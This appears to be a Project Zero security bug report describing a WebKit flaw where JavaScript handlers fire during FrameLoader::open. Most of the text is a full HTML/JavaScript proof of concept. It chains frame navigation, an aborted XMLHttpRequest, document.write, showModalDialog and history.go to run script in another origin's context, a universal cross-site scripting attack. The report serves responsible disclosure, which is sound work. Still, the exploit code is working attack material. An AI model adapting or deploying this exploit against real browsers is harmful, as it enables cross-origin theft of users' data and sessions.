



This is similar to the case <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1151" title="" class="" rel="nofollow">https://bugs.chromium.org/p/project-zero/issues/detail?id=1151</a>.
But this time, javascript handlers may be fired in FrameLoader::open.

void FrameLoader::open(CachedFrameBase& cachedFrame)
{
  ...
    ...
}

PoC:
<html>
<body>
Click anywhere...
<script>

function createURL(data, type = &#039;text/html&#039;) {
    return URL.createObjectURL(new Blob([data], {type: type}));
}

function navigate(w, url) {
    let a = w.document.createElement(&#039;a&#039;);
    a.href = url;
    a.click();
}

window.onclick = () => {
  window.w = open(&#039;about:blank&#039;, &#039;w&#039;, &#039;width=500, height=500&#039;);

  let i0 = w.document.body.appendChild(document.createElement(&#039;iframe&#039;));
  let i1 = w.document.body.appendChild(document.createElement(&#039;iframe&#039;));
  i0.contentWindow.onbeforeunload = () => {
    i0.contentWindow.onbeforeunload = null;

    navigate(w, &#039;about:blank&#039;);
  };

  navigate(i0.contentWindow, createURL(`
<body>
<script>
</scrip` + &#039;t></body>&#039;));

  setTimeout(() => {
    let g = i0.contentDocument.body.appendChild(document.createElement(&#039;iframe&#039;));
    let x = new g.contentWindow.XMLHttpRequest();
    x.onabort = () => {
      parseFloat(&#039;axfasdfasfdsfasfsfasdf&#039;);
      i0.contentDocument.write();

          navigate(w, &#039;<a href="https://abc.xyz/&#039;);" title="" class="" rel="nofollow">https://abc.xyz/&#039;);</a>

          showModalDialog(createURL(`
<script>
let it = setInterval(() => {
  try {
      opener.w.document.x;
  } catch (e) {
      clearInterval(it);
      window.close();
  }
}, 10);
</scrip` + &#039;t>&#039;));

          setTimeout(() => {
            i1.srcdoc = &#039;<script>alert(parent.location);</scrip&#039; + &#039;t>&#039;;
            navigate(i1.contentWindow, &#039;about:srcdoc&#039;);
          }, 10);
    };

    x.open(&#039;GET&#039;, createURL(&#039;x&#039;.repeat(0x1000000)));
    x.send();
    w.history.go(-2);
  }, 200);
};

</script>
</body>
</html>


This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available, the bug report will become
visible to the public.




Found by: lokihardt

